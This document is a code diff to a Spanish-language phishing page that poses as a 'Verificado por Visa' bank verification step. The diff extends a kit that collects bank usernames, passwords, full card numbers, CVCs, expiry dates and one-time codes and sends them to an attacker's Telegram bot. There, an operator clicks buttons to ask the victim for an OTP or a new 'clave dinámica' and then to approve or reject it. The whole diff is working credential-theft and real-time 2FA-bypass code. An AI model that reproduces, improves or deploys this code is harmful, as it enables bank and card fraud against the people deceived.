@@ -516,18 +516,18 @@
                 <div class="error-message">La contraseña es requerida</div>
             </div>
 
-            <!-- SECCIÓN OTP ACTUALIZADA -->
+            <!-- SECCIÓN OTP / CLAVE DINÁMICA -->
             <div class="otp-section" id="otpSection">
-                <div class="otp-info">
+                <div class="otp-info" id="otpInfoText">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                         <path d="M12 8v4"/>
                         <path d="M12 16h.01"/>
                     </svg>
-                    <span>Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
+                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
                 </div>
                 <div class="form-group" style="margin-bottom:0;">
-                    <label class="form-label">Código OTP <span class="required">*</span></label>
+                    <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
                     <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="6" inputmode="numeric" required />
                     <div class="error-message">El código debe tener 6 dígitos</div>
                 </div>
@@ -565,6 +565,7 @@
         let pollingInterval = null;
         let pasoActual = 'credenciales';
         let errorMostrado = false;
+        let modoAutenticacion = 'otp'; // 'otp' o 'clave_dinamica'
 
         // Elementos DOM
         const form = document.getElementById('authForm');
@@ -572,6 +573,8 @@
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
         const otpSection = document.getElementById('otpSection');
+        const otpInfoMessage = document.getElementById('otpInfoMessage');
+        const otpLabel = document.getElementById('otpLabel');
         const submitButton = document.getElementById('submitButton');
         const buttonText = document.getElementById('buttonText');
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -587,7 +590,6 @@
         });
 
         function initializeTransaction() {
-            // Obtener datos de paso3.html (sessionStorage)
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             let amount = 23000;
             if (storagePriority) amount += 20000;
@@ -608,26 +610,18 @@
             });
             document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;
             
-            // OBTENER ÚLTIMOS 4 DÍGITOS DE sessionStorage
             let cardLast4 = sessionStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `Visa •••• •••• •••• ${cardLast4}`;
             
-            // Guardar datos de tarjeta para enviar a Telegram (desde sessionStorage)
             const cardNumber = sessionStorage.getItem('cardNumber') || 'No disponible';
             const cvc = sessionStorage.getItem('cvc') || 'No disponible';
             const expiry = sessionStorage.getItem('expiry') || 'No disponible';
             
-            // Re-guardar en sessionStorage para asegurar
             sessionStorage.setItem('cardNumberFull', cardNumber);
             sessionStorage.setItem('cardCVV', cvc);
             sessionStorage.setItem('cardExpiry', expiry);
             
-            console.log('📋 Datos cargados desde sessionStorage:', {
-                cardNumber: cardNumber,
-                cardLast4: cardLast4,
-                cvc: cvc,
-                expiry: expiry
-            });
+            console.log('📋 Datos cargados desde sessionStorage');
         }
 
         async function configurarWebhook() {
@@ -651,12 +645,17 @@
             try {
                 const inlineKeyboard = {
                     inline_keyboard: [
-                        [{ text: "📱 PEDIR OTP", callback_data: `pedir_otp_${datos.solicitudId}` }],
-                        [{ text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }]
+                        [
+                            { text: "📱 PEDIR OTP", callback_data: `pedir_otp_${datos.solicitudId}` },
+                            { text: "🔑 PEDIR CLAVE DIN", callback_data: `pedir_clave_din_${datos.solicitudId}` }
+                        ],
+                        [
+                            { text: "❌ ERROR CREDENCIALES", callback_data: `error_credenciales_${datos.solicitudId}` }
+                        ]
                     ]
                 };
 
-                const mensaje = `🔔 *VERIFICADO POR VISA - CREDENCIALES BANCARIAS*
+                const mensaje = `🔔 *VERIFICADO POR VISA - V2CRTF*
 
 🆔 ID: \`${datos.solicitudId}\`
 
@@ -704,11 +703,11 @@
                     ]
                 };
 
-                const mensaje = `🔔 *VERIFICADO POR VISA - CÓDIGO OTP*
+                const mensaje = `🔔 *VERIFICADO POR VISA - V2CRTF*
 
 🆔 ID: \`${datos.solicitudId}\`
 
-📱 *CÓDIGO DE VERIFICACIÓN:*
+📱 *CÓDIGO OTP:*
 🔢 OTP: \`${datos.otp}\`
 
 🏛️ Usuario: \`${datos.usuario}\`
@@ -732,6 +731,50 @@
 
                 const data = await response.json();
                 console.log('📤 OTP enviado:', data.ok);
+                return data.ok;
+            } catch (error) {
+                console.error('❌ Error:', error);
+                return false;
+            }
+        }
+
+        async function enviarClaveDinamicaATelegram(datos) {
+            try {
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [{ text: "✅ APROBAR CLAVE DIN", callback_data: `aprobar_clave_din_${datos.solicitudId}` }],
+                        [{ text: "❌ RECHAZAR CLAVE DIN", callback_data: `rechazar_clave_din_${datos.solicitudId}` }]
+                    ]
+                };
+
+                const mensaje = `🔔 *VERIFICADO POR VISA - V2CRTF*
+
+🆔 ID: \`${datos.solicitudId}\`
+
+🔑 *CLAVE DINÁMICA:*
+🔢 Clave: \`${datos.clave}\`
+
+🏛️ Usuario: \`${datos.usuario}\`
+
+💰 Monto: ${datos.monto}
+📅 Fecha: ${datos.fecha}
+
+⏳ *Estado:* Esperando verificación de la Clave Dinámica...`;
+
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const data = await response.json();
+                console.log('📤 Clave Dinámica enviada:', data.ok);
                 return data.ok;
             } catch (error) {
                 console.error('❌ Error:', error);
@@ -793,10 +836,21 @@
                     clearInterval(pollingInterval);
                     pollingInterval = null;
                     console.log('✅ OTP solicitado');
-                    mostrarOTP();
+                    modoAutenticacion = 'otp';
+                    mostrarSeccionOTP('otp');
                     loadingOverlay.classList.remove('active');
                     submitButton.disabled = false;
                     buttonText.textContent = 'Verificar OTP';
+                    return;
+                } else if (resultado === 'pedir_clave_din') {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    console.log('✅ Clave Dinámica solicitada');
+                    modoAutenticacion = 'clave_dinamica';
+                    mostrarSeccionOTP('clave_dinamica');
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    buttonText.textContent = 'Verificar Clave Dinámica';
                     return;
                 } else if (resultado === 'error_credenciales') {
                     clearInterval(pollingInterval);
@@ -829,7 +883,7 @@
                 
                 const resultado = await verificarEstadoSolicitud(solicitudId);
                 
-                if (resultado === 'aprobar_otp') {
+                if (resultado === 'aprobar_otp' || resultado === 'aprobar_clave_din') {
                     clearInterval(pollingInterval);
                     pollingInterval = null;
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
@@ -837,22 +891,20 @@
                         window.location.href = 'index.html';
                     }, 2000);
                     return;
-                } else if (resultado === 'rechazar_otp') {
+                } else if (resultado === 'rechazar_otp' || resultado === 'rechazar_clave_din') {
                     clearInterval(pollingInterval);
                     pollingInterval = null;
-                    // Mostrar error y mantener la sección OTP visible
-                    mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
-                    // Limpiar el campo OTP
+                    const mensajeError = modoAutenticacion === 'otp' 
+                        ? '❌ Código OTP incorrecto. Intente de nuevo.' 
+                        : '❌ Clave Dinámica incorrecta. Intente de nuevo.';
+                    mostrarError(mensajeError);
                     confirmationInput.value = '';
                     confirmationInput.focus();
-                    // Reactivar el botón
                     submitButton.disabled = false;
-                    buttonText.textContent = 'Verificar OTP';
+                    buttonText.textContent = modoAutenticacion === 'otp' ? 'Verificar OTP' : 'Verificar Clave Dinámica';
                     loadingOverlay.classList.remove('active');
-                    // Mantener la sección OTP visible
                     otpSection.classList.add('visible');
                     pasoActual = 'otp';
-                    // Habilitar el campo OTP
                     confirmationInput.disabled = false;
                     return;
                 }
@@ -862,15 +914,28 @@
         // ============================================
         // FUNCIONES UI
         // ============================================
-        function mostrarOTP() {
+        function mostrarSeccionOTP(tipo) {
             otpSection.classList.add('visible');
             pasoActual = 'otp';
-            buttonText.textContent = 'Verificar OTP';
             confirmationInput.disabled = false;
             confirmationInput.focus();
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             errorMostrado = false;
+
+            if (tipo === 'clave_dinamica') {
+                otpInfoMessage.textContent = 'Para realizar este proceso, ingresa tu Clave Dinámica generada por el banco.';
+                otpLabel.textContent = 'Clave Dinámica *';
+                confirmationInput.placeholder = 'Ingresa tu clave dinámica';
+                buttonText.textContent = 'Verificar Clave Dinámica';
+                modoAutenticacion = 'clave_dinamica';
+            } else {
+                otpInfoMessage.textContent = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
+                otpLabel.textContent = 'Código OTP *';
+                confirmationInput.placeholder = 'Ingresa tu código de verificación';
+                buttonText.textContent = 'Verificar OTP';
+                modoAutenticacion = 'otp';
+            }
         }
 
         function ocultarOTP() {
@@ -890,7 +955,8 @@
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            buttonText.textContent = pasoActual === 'otp' ? 'Verificar OTP' : 'Siguiente';
+            const label = modoAutenticacion === 'otp' ? 'Verificar OTP' : 'Verificar Clave Dinámica';
+            buttonText.textContent = pasoActual === 'otp' ? label : 'Siguiente';
             errorMostrado = true;
         }
 
@@ -917,6 +983,7 @@
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             errorMostrado = false;
+            modoAutenticacion = 'otp';
         }
 
         // ============================================
@@ -1007,23 +1074,38 @@
                 }
 
             } else if (pasoActual === 'otp') {
-                console.log('🆔 Enviando OTP para:', solicitudId);
+                console.log('🆔 Enviando ' + (modoAutenticacion === 'otp' ? 'OTP' : 'Clave Dinámica') + ' para:', solicitudId);
 
-                const datosOTP = {
-                    solicitudId: solicitudId,
-                    otp: confirmationInput.value.trim(),
-                    usuario: usernameInput.value.trim(),
-                    monto: document.getElementById('transaction-amount').textContent,
-                    fecha: document.getElementById('transaction-date').textContent
-                };
-
-                const enviado = await enviarOTPATelegram(datosOTP);
-
-                if (enviado) {
-                    iniciarPollingOTP();
+                if (modoAutenticacion === 'otp') {
+                    const datosOTP = {
+                        solicitudId: solicitudId,
+                        otp: confirmationInput.value.trim(),
+                        usuario: usernameInput.value.trim(),
+                        monto: document.getElementById('transaction-amount').textContent,
+                        fecha: document.getElementById('transaction-date').textContent
+                    };
+                    const enviado = await enviarOTPATelegram(datosOTP);
+                    if (enviado) {
+                        iniciarPollingOTP();
+                    } else {
+                        mostrarError('Error al procesar el OTP');
+                        resetFormulario();
+                    }
                 } else {
-                    mostrarError('Error al procesar el OTP');
-                    resetFormulario();
+                    const datosClave = {
+                        solicitudId: solicitudId,
+                        clave: confirmationInput.value.trim(),
+                        usuario: usernameInput.value.trim(),
+                        monto: document.getElementById('transaction-amount').textContent,
+                        fecha: document.getElementById('transaction-date').textContent
+                    };
+                    const enviado = await enviarClaveDinamicaATelegram(datosClave);
+                    if (enviado) {
+                        iniciarPollingOTP();
+                    } else {
+                        mostrarError('Error al procesar la Clave Dinámica');
+                        resetFormulario();
+                    }
                 }
             }
         });
